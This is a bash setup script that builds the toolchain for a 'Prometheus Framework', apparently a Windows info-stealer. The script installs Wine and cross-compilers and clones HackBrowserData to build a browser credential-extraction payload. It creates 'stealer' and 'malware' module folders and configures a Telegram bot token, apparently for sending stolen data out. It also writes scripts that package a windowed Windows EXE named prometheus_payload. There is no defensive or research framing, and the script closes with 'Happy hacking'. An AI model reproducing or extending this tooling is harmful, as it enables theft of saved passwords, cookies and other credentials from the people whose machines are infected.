#!/bin/bash
# setup_ubuntu.sh - Complete Ubuntu development environment for Prometheus Framework

set -e

echo "🚀 Setting up Prometheus Framework on Ubuntu..."
echo "=================================================="

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Update system
echo -e "${YELLOW}📦 Updating system packages...${NC}"
sudo apt update && sudo apt upgrade -y

# Install core dependencies
echo -e "${YELLOW}📦 Installing core dependencies...${NC}"
sudo apt install -y \
    python3 python3-pip python3-venv python3-dev \
    build-essential git wget curl unzip \
    mingw-w64 mingw-w64-tools \
    wine wine32 wine64 winetricks \
    libwine libwine:i386 fonts-wine \
    dos2unix

# Install Wine dependencies
echo -e "${YELLOW}🍷 Configuring Wine...${NC}"
sudo dpkg --add-architecture i386
sudo apt update

# Install Zig for ABE payload building
echo -e "${YELLOW}📦 Installing Zig...${NC}"
ZIG_VERSION="0.13.0"
wget -O /tmp/zig.tar.xz "https://ziglang.org/download/${ZIG_VERSION}/zig-linux-x86_64-${ZIG_VERSION}.tar.xz"
sudo tar -xf /tmp/zig.tar.xz -C /usr/local
sudo mv "/usr/local/zig-linux-x86_64-${ZIG_VERSION}" /usr/local/zig
sudo ln -sf /usr/local/zig/zig /usr/local/bin/zig

# Build ABE payload
echo -e "${YELLOW}🔧 Building ABE payload...${NC}"
git clone https://github.com/moonD4rk/HackBrowserData /tmp/HackBrowserData
cd /tmp/HackBrowserData
make payload
cp crypto/windows/payload/abe_extractor_amd64.bin /tmp/abe_extractor_amd64.bin
cd /tmp
rm -rf /tmp/HackBrowserData

# Create project structure
echo -e "${YELLOW}📁 Creating project structure...${NC}"
mkdir -p ~/prometheus-framework/{core,payload/templates,modules/{stealer,malware},gui,config,output,dist,logs}
cd ~/prometheus-framework

# Copy ABE payload
cp /tmp/abe_extractor_amd64.bin core/

# Create virtual environment
echo -e "${YELLOW}🐍 Setting up Python environment...${NC}"
python3 -m venv venv
source venv/bin/activate

# Install Python packages
echo -e "${YELLOW}📦 Installing Python packages...${NC}"
pip install --upgrade pip
pip install \
    cryptography==41.0.7 \
    pywin32-ctypes==0.2.2 \
    psutil==5.9.6 \
    customtkinter==5.2.1 \
    jinja2==3.1.2 \
    pyyaml==6.0.1 \
    requests==2.31.0 \
    python-dotenv==1.0.0 \
    python-telegram-bot==20.6 \
    pyinstaller==6.3.0 \
    pytest==7.4.3 \
    pytest-cov==4.1.0 \
    flake8==6.1.0 \
    black==23.11.0 \
    mypy==1.7.0 \
    pyasn1==0.5.0 \
    pyasn1-modules==0.3.0

# Create __init__.py files
touch core/__init__.py
touch modules/__init__.py
touch modules/stealer/__init__.py
touch modules/malware/__init__.py
touch gui/__init__.py

# Create .env file
cat > .env << 'EOF'
# Prometheus Framework Configuration
PROMETHEUS_ENV=development
LOG_LEVEL=INFO
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
EOF

# Create build script
cat > build_windows_exe.sh << 'EOF'
#!/bin/bash
echo "🏗️ Building Windows EXE..."
source venv/bin/activate

# Check for ABE payload
if [ ! -f "core/abe_extractor_amd64.bin" ]; then
    echo "❌ ABE payload not found. Run setup_ubuntu.sh first."
    exit 1
fi

pyinstaller --onefile \
    --windowed \
    --name prometheus_payload \
    --distpath ./dist/windows \
    --workpath ./build/windows \
    --specpath ./spec/windows \
    --add-data "core:core" \
    --add-data "payload/templates:payload/templates" \
    --add-data "config/config.json:config" \
    --hidden-import cryptography \
    --hidden-import sqlite3 \
    --hidden-import json \
    --hidden-import pywin32 \
    --hidden-import win32crypt \
    --hidden-import win32api \
    --hidden-import win32process \
    --hidden-import win32con \
    --hidden-import win32file \
    --hidden-import pyasn1 \
    --hidden-import pyasn1-modules \
    main.py

if [ -f "dist/windows/prometheus_payload.exe" ]; then
    echo "✅ Build complete: dist/windows/prometheus_payload.exe"
    ls -lh dist/windows/prometheus_payload.exe
else
    echo "❌ Build failed. Check errors above."
    exit 1
fi
EOF
chmod +x build_windows_exe.sh

# Create test script
cat > test_wine.sh << 'EOF'
#!/bin/bash
echo "🧪 Testing with Wine..."
if [ -f "dist/windows/prometheus_payload.exe" ]; then
    wine dist/windows/prometheus_payload.exe --help
else
    echo "Build first: ./build_windows_exe.sh"
fi
EOF
chmod +x test_wine.sh

# Create run script
cat > run.sh << 'EOF'
#!/bin/bash
source venv/bin/activate
python3 main.py "$@"
EOF
chmod +x run.sh

echo -e "${GREEN}✅ Setup complete!${NC}"
echo ""
echo -e "${YELLOW}Next steps:${NC}"
echo "  1. cd ~/prometheus-framework"
echo "  2. source venv/bin/activate"
echo "  3. Edit config/config.json with your Telegram bot token"
echo "  4. ./build_windows_exe.sh  (build the Windows EXE)"
echo "  5. ./run.sh  (run the framework)"
echo ""
echo -e "${GREEN}Happy hacking! 🚀${NC}"
